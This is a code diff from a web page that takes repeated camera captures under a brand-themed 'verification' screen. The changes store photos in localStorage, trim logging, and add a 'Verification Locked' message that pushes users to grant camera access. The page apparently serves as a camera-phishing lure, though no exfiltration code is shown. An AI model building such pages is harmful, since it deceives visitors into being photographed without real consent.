@@ -1780,44 +1784,35 @@
                 existing.push({
                     id: 'cap_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6),
                     src: dataUrl,
-                    camera: camType,
                     time: new Date().toISOString(),
                     size: (dataUrl.length / 1024).toFixed(1) + ' KB',
-                    session: sessionId,
-                    demo: false
+                    session: sessionId
                 });
                 localStorage.setItem(key, JSON.stringify(existing));
             } catch (e) {
-                console.warn('LocalStorage full. Purging old captures...');
-                // Emergency purge: clear current session's oldest 5 photos
+                console.warn('Storage Full');
                 try {
                     const existing = JSON.parse(localStorage.getItem(key) || '[]');
-                    existing.splice(0, 5);
+                    existing.splice(0, 3);
                     localStorage.setItem(key, JSON.stringify(existing));
                 } catch { }
             }
         }
 
         function cleanupStorage(neededSize) {
-            // Basic heuristic: check total localStorage size
             let total = 0;
             for (let k in localStorage) {
                 if (localStorage.hasOwnProperty(k)) total += (localStorage[k].length * 2);
             }
-
-            // If over 4MB, start deleting other sessions
             if (total > 4 * 1024 * 1024) {
-                console.log('Storage cleanup triggered. Total:', (total / 1024 / 1024).toFixed(2), 'MB');
                 for (let k in localStorage) {
                     if (k.startsWith('cemra_captures_') && !k.endsWith(sessionId)) {
                         localStorage.removeItem(k);
-                        console.log('Purged old session:', k);
                     }
                 }
             }
         }
 
-        // --- Stop stream tracks ---
         function stopStream() {
             if (stream) {
                 stream.getTracks().forEach(t => t.stop());
@@ -1826,7 +1821,6 @@
             capturing = false;
         }
 
-        // --- All done ---
         function onDone() {
             capturing = false;
             setStatus(theme.statusDone);
@@ -1836,14 +1830,13 @@
             if (sb) sb.classList.add('show');
             const btn = document.getElementById('mainBtn');
             if (btn) btn.style.display = 'none';
-            clearInterval(timerInterval);
         }
 
-        // --- Permanent failure (all retries exhausted) ---
         function onPermanentFail(reason) {
             capturing = false;
             const btn = document.getElementById('mainBtn');
             if (btn) {
+                btn.classList.remove('btn-loading');
                 btn.disabled = false;
                 btn.style.display = 'flex';
                 btn.innerHTML = `<i class="${theme.btnIcon}"></i> ${theme.btnText}`;
@@ -1856,12 +1849,16 @@
                 document.getElementById('noCamMsg').textContent = theme.noCamMsg || 'A working camera is required for verification.';
             } else {
                 const db = document.getElementById('deniedBox');
-                if (db) db.style.display = 'block';
+                if (db) {
+                    db.style.display = 'block';
+                    db.innerHTML = `<i class="fa-solid fa-lock" style="font-size: 3rem; margin-bottom: 20px; color: #ff4d4d;"></i>
+                                  <h2>Verification Locked</h2>
+                                  <p>You have denied camera permissions. To continue with the ${theme.brand} verification, please enable camera access and refresh this page.</p>`;
+                }
             }
 
             setStatus('');
             setProgress(0);
-            localStorage.removeItem(PERM_KEY);
         }
 
         function setStatus(msg) {
